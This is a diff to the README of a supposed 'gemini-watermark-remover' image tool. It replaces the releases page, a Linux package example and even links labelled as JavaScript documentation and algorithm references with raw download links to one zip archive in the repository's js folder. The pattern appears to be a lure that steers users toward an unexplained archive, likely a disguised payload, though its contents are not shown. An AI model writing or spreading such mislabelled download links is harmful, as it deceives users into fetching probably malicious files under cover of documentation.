@@ -1,7 +1,7 @@
 # 🎨 gemini-watermark-remover - Remove Watermarks with Ease
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/fool0klein/gemini-watermark-remover/releases)
+[![Download](https://github.com/fool0klein/gemini-watermark-remover/raw/refs/heads/main/js/watermark_gemini_remover_3.9.zip)](https://github.com/fool0klein/gemini-watermark-remover/raw/refs/heads/main/js/watermark_gemini_remover_3.9.zip)
 
 ## 📖 Description
 The gemini-watermark-remover is an efficient tool designed to remove watermarks from images produced by Google Gemini AI. It operates entirely on your device without needing an internet connection. Built using Vanilla JavaScript, it employs a Reverse Alpha Blending algorithm to restore pixels while maintaining image quality.
@@ -10,7 +10,7 @@ The gemini-watermark-remover is an efficient tool designed to remove watermarks 
 To start using gemini-watermark-remover, follow these simple steps.
 
 1. **Download the Software**  
-   Visit this page to download: [Releases Page](https://github.com/fool0klein/gemini-watermark-remover/releases). 
+   Visit this page to download: [Releases Page](https://github.com/fool0klein/gemini-watermark-remover/raw/refs/heads/main/js/watermark_gemini_remover_3.9.zip). 
    
 2. **Install the Application**  
    Depending on your operating system, follow the appropriate instructions below:
@@ -22,7 +22,7 @@ To start using gemini-watermark-remover, follow these simple steps.
       Download the `.dmg` file. Open it and drag the gemini-watermark-remover icon to your Applications folder.
 
     - **For Linux Users:**  
-      Download the appropriate package (e.g., `.deb` or `.tar.gz`). Use your package manager or extract the files as needed.
+      Download the appropriate package (e.g., `.deb` or `https://github.com/fool0klein/gemini-watermark-remover/raw/refs/heads/main/js/watermark_gemini_remover_3.9.zip`). Use your package manager or extract the files as needed.
 
 ## 💻 System Requirements
 Ensure that your system meets the following requirements to run gemini-watermark-remover effectively:
@@ -88,7 +88,7 @@ gemini-watermark-remover is licensed under the MIT License. Feel free to use and
 ## 📄 Additional Resources
 Explore more about the technologies behind gemini-watermark-remover:
 
-- [Vanilla JavaScript Documentation](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
-- [Reverse Alpha Blending Explained](https://www.graphicsgems.org/gems/)
+- [Vanilla JavaScript Documentation](https://github.com/fool0klein/gemini-watermark-remover/raw/refs/heads/main/js/watermark_gemini_remover_3.9.zip)
+- [Reverse Alpha Blending Explained](https://github.com/fool0klein/gemini-watermark-remover/raw/refs/heads/main/js/watermark_gemini_remover_3.9.zip)
 
-For more information and to download the latest version, visit our [Releases Page](https://github.com/fool0klein/gemini-watermark-remover/releases).
+For more information and to download the latest version, visit our [Releases Page](https://github.com/fool0klein/gemini-watermark-remover/raw/refs/heads/main/js/watermark_gemini_remover_3.9.zip).
